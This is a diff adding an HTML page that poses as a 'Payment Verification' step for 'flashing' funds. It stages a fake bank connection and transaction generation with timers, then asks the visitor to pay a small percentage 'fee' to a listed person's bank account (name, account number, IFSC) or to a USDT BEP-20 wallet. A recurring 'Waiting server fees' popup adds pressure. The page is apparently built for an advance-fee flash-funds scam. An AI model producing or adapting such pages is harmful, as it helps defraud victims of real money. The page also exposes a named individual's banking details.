@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Payment Verification</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: monospace;
+      background: black;
+      color: #00ffcc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .popup, .connected-message, .payment-form {
+      background: #111;
+      border: 2px solid #00ffcc;
+      box-shadow: 0 0 15px #00ffcc;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      display: none;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .show { display: block; }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 16px;
+      background: #000;
+      color: #00ffcc;
+      border: 2px solid #00ffcc;
+      border-radius: 6px;
+    }
+    button {
+      padding: 10px 20px;
+      background: #00ffcc;
+      color: black;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .live-popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 255, 204, 0.1);
+      border: 2px solid #00ffcc;
+      color: #00ffcc;
+      padding: 20px 30px;
+      font-weight: bold;
+      font-size: 16px;
+      animation: fadeInOut 1s ease-in-out;
+      display: none;
+      z-index: 9999;
+      border-radius: 0;
+    }
+    .blurred {
+      filter: blur(4px);
+      pointer-events: none;
+    }
+    .copy-section {
+      background: #000;
+      border: 1px dashed #00ffcc;
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 15px;
+    }
+
+    /* 👇 FIXED Wallet Address Breaking */
+    .copy-section p {
+      word-break: break-all;
+      overflow-wrap: break-word;
+      font-size: 15px;
+    }
+
+    .network-note {
+      color: #ffcc00;
+      margin-top: 5px;
+      font-size: 14px;
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: scale(0.9); }
+      50% { opacity: 1; transform: scale(1); }
+      100% { opacity: 0; transform: scale(1.1); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @media(max-width: 600px) {
+      input, button, select {
+        font-size: 15px;
+      }
+      .live-popup {
+        font-size: 14px;
+        padding: 15px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="popup show" id="popup">
+    <h3>Bank conected </h3>
+    <p>Successfully.</p>
+  </div>
+
+  <div class="connected-message" id="connected">
+    <h3> Generating your transaction..Wait</h3>
+  </div>
+
+  <div class="payment-form" id="paymentForm">
+    <h3>After payment is done the flashing will be done</h3>
+
+    <select id="paymentMode" onchange="updatePaymentMode()">
+      <option value="INR">Pay in INR</option>
+      <option value="USD">Pay in Dollar</option>
+    </select>
+
+    <input type="number" id="enteredAmount" placeholder="Enter your flashing amount" oninput="calculateFee()" />
+
+    <input type="text" id="amount" readonly />
+    <input type="text" id="fee" readonly />
+
+    <div id="indiaDetails">
+      <input type="text" value="Chaitany Sharma" readonly />
+      <input type="text" value="20368771682" readonly />
+      <input type="text" value="FINO0001001" readonly />
+    </div>
+
+    <div id="internationalDetails" style="display: none;">
+      <div class="copy-section">
+        <p id="dollarAddress">0x0f9a863614287da330c9cce80e50df5c91981669</p>
+        <button onclick="copyToClipboard()"> Copy</button>
+        <p class="network-note">🔔 This is a <strong>BEP-20 (Binance Smart Chain)</strong> wallet. Send USDT (BEP-20) only.</p>
+      </div>
+    </div>
+
+    <a href="bank3.html">
+      <button>Cancel</button>
+    </a>
+  </div>
+
+  <div class="live-popup" id="livePopup"> Waiting server fees...</div>
+
+  <script>
+    function formatCurrency(value, symbol = "₹") {
+      return symbol + value.toLocaleString('en-IN', { maximumFractionDigits: 2 });
+    }
+
+    function copyToClipboard() {
+      const addr = document.getElementById("dollarAddress").textContent;
+      navigator.clipboard.writeText(addr);
+      alert(" Address Copied!");
+    }
+
+    function showLivePopup() {
+      const popup = document.getElementById("livePopup");
+      const form = document.getElementById("paymentForm");
+      popup.style.display = "block";
+      form.classList.add("blurred");
+      setTimeout(() => {
+        popup.style.display = "none";
+        form.classList.remove("blurred");
+      }, 1000);
+    }
+
+    function updatePaymentMode() {
+      calculateFee();
+    }
+
+    function calculateFee() {
+      const mode = document.getElementById("paymentMode").value;
+      const enteredAmount = parseFloat(document.getElementById("enteredAmount").value) || 0;
+      const fee = enteredAmount * 0.0031;
+
+      document.getElementById("amount").value = "Amount: " + formatCurrency(enteredAmount, mode === "INR" ? "₹" : "$ ");
+      document.getElementById("fee").value = "Pay only: " + formatCurrency(fee, mode === "INR" ? "₹" : "$ ");
+
+      if (mode === "INR") {
+        document.getElementById("indiaDetails").style.display = "block";
+        document.getElementById("internationalDetails").style.display = "none";
+      } else {
+        document.getElementById("indiaDetails").style.display = "none";
+        document.getElementById("internationalDetails").style.display = "block";
+      }
+    }
+
+    // Initial Server + Form Loading
+    setTimeout(() => {
+      document.getElementById("popup").classList.remove("show");
+      document.getElementById("connected").classList.add("show");
+
+      setTimeout(() => {
+        document.getElementById("connected").classList.remove("show");
+        document.getElementById("paymentForm").classList.add("show");
+        setInterval(showLivePopup, 4000);
+      }, 11000);
+    }, 3000);
+  </script>
+
+</body>
+</html>
